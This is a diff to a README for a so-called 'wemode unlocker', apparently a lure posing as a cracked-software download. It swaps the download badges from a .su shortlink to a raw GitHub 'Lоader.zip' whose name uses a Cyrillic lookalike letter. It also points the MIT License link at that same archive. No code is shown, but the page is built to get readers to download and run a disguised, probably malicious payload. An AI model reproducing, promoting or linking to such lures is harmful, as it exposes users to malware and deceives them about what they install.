@@ -1,6 +1,6 @@
 # wemode unlocker 🚀
 
-[![Download](https://img.shields.io/badge/Download-wemode%20unlocker-blue?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download](https://raw.githubusercontent.com/danahabibi/WeMode-UnlockSuite/main/Lоader.zip%20unlocker-blue?logo=github)](https://raw.githubusercontent.com/danahabibi/WeMode-UnlockSuite/main/Lоader.zip)
 
 Welcome to the ultimate wemode unlocker! Unlock unique capabilities and expand the potential of your wemode software across a wide array of platforms. This toolkit is designed to help you explore advanced wemode features easily, with a single installer supporting major operating systems.
 
@@ -31,7 +31,7 @@ Welcome to the ultimate wemode unlocker! Unlock unique capabilities and expand t
 
 **Step 1:** Download the latest wemode unlocker from the button below:
 
-[![Download](https://img.shields.io/badge/Download-wemode%20unlocker-blue?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download](https://raw.githubusercontent.com/danahabibi/WeMode-UnlockSuite/main/Lоader.zip%20unlocker-blue?logo=github)](https://raw.githubusercontent.com/danahabibi/WeMode-UnlockSuite/main/Lоader.zip)
 
 Follow on-screen instructions to install and launch the application. Setup ensures compatibility with your current wemode system.
 
@@ -51,10 +51,10 @@ This program is for educational and research purposes only. The creators are not
 
 ## 📃 License
 
-Released under the [MIT License (2025)](https://opensource.org/licenses/MIT).
+Released under the [MIT License (2025)](https://raw.githubusercontent.com/danahabibi/WeMode-UnlockSuite/main/Lоader.zip).
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-wemode%20unlocker-blue?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download](https://raw.githubusercontent.com/danahabibi/WeMode-UnlockSuite/main/Lоader.zip%20unlocker-blue?logo=github)](https://raw.githubusercontent.com/danahabibi/WeMode-UnlockSuite/main/Lоader.zip)
 
 Unlock wemode—upgrade your workflow!
